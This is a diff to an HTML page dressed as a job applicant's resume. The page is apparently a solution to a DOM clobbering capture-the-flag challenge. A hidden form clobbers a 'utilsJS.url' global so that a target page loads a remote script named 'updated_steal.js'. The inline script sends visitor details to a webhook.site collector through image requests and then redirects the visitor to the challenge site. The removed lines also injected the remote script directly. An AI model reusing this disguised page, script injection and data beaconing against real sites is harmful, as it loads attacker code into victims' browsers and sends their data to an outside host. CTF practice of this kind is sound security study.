@@ -13,11 +13,10 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: Simplified DOM Clobbering for utilsJS.url -->
-          <form id="utilsJS">
-                <input name="url" 
-            value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
-          </form>
+         <!-- CRITICAL: DOM Clobbering structure -->
+         <form id="utilsJS">
+             <input name="url" value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
+         </form>
 
          <div class="resume">
              <h1>Michael Thompson</h1>
@@ -49,7 +48,7 @@
          </div>
 
          <script>
-             console.log('FIXED DOM CLOBBERING - PROPER URL EXTRACTION');
+             console.log('IMMEDIATE NAVIGATION STRATEGY');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -59,110 +58,35 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/fixed-strategy?' +
-     params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/immediate?' + params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
              }
 
-             // Send initial confirmation with detailed DOM clobbering analysis
+             // Send confirmation and immediately navigate
              sendWebhook({
-                 status: 'FIXED_DOM_CLOBBERING_START',
+                 status: 'IMMEDIATE_NAVIGATION_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
-                 current_url: window.location.href,
-                 utilsJS_exists: !!window.utilsJS,
-                 utilsJS_type: typeof window.utilsJS,
-                 utilsJS_toString: String(window.utilsJS),
-                 utilsJS_url_exists: !!window.utilsJS?.url,
-                 utilsJS_url_type: typeof window.utilsJS?.url,
+                 utilsJS_ready: !!window.utilsJS && !!window.utilsJS.url,
                  utilsJS_url_value: window.utilsJS?.url?.value || 'not_found',
-                 utilsJS_url_toString: String(window.utilsJS?.url || 'null'),
                  user_agent: navigator.userAgent
              });
 
-             // Test the exact vulnerable function logic
-             setTimeout(() => {
-                 try {
-                     // This is the exact logic from the vulnerable function
-                     let utilJS = window.utilsJS || {};
-                     let scriptSrc = utilJS.url;
-
-                     sendWebhook({
-                         status: 'VULNERABLE_FUNCTION_LOGIC_TEST',
-                         timestamp: new Date().toISOString(),
-                         utilJS_exists: !!utilJS,
-                         utilJS_type: typeof utilJS,
-                         scriptSrc_initial: scriptSrc,
-                         scriptSrc_type: typeof scriptSrc,
-                         scriptSrc_toString: String(scriptSrc)
-                     });
-
-                     // If scriptSrc is an object (form element), try to get the value
-                     if (scriptSrc && typeof scriptSrc === 'object') {
-                         if (scriptSrc.value) {
-                             scriptSrc = scriptSrc.value;
-                         } else if (scriptSrc.getAttribute) {
-                             scriptSrc = scriptSrc.getAttribute('value');
-                         }
-                     }
-
-                     sendWebhook({
-                         status: 'SCRIPT_SOURCE_EXTRACTION',
-                         timestamp: new Date().toISOString(),
-                         final_scriptSrc: scriptSrc,
-                         final_type: typeof scriptSrc,
-                         is_string: typeof scriptSrc === 'string',
-                         is_valid_url: scriptSrc && scriptSrc.startsWith('http')
-                     });
-
-                     if (scriptSrc && typeof scriptSrc === 'string' && scriptSrc.startsWith('http')) {
-                         let script = document.createElement('script');
-                         script.src = scriptSrc;
-                         document.body.appendChild(script);
-
-                         sendWebhook({
-                             status: 'PAYLOAD_SCRIPT_LOADED_FIXED',
-                             timestamp: new Date().toISOString(),
-                             script_src: scriptSrc,
-                             success: true
-                         });
-                     } else {
-                         sendWebhook({
-                             status: 'SCRIPT_SOURCE_INVALID',
-                             timestamp: new Date().toISOString(),
-                             scriptSrc: scriptSrc,
-                             reason: 'not_valid_url'
-                         });
-                     }
-
-                 } catch(e) {
-                     sendWebhook({
-                         status: 'ERROR_VULNERABLE_FUNCTION_TEST',
-                         timestamp: new Date().toISOString(),
-                         error: e.message,
-                         stack: e.stack
-                     });
-                 }
-             }, 2000);
-
-             // Navigate to CTF site where the real vulnerable function will be called
+             // Navigate to CTF domain immediately (500ms delay for webhook)
              setTimeout(() => {
                  const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
 
                  sendWebhook({
-                     status: 'NAVIGATING_TO_CTF_FOR_REAL_EXPLOIT',
+                     status: 'NAVIGATING_TO_CTF_NOW',
                      timestamp: new Date().toISOString(),
-                     target_url: ctfUrl,
-                     dom_clobbering_ready: !!window.utilsJS && !!window.utilsJS.url
+                     target_url: ctfUrl
                  });
 
-                 // Add a small delay to ensure webhook is sent
-                 setTimeout(() => {
-                     window.location.href = ctfUrl;
-                 }, 500);
-             }, 4000);
+                 // Navigate immediately to CTF domain where flag exists
+                 window.location.href = ctfUrl;
+             }, 500);
 
          </script>
      </body>
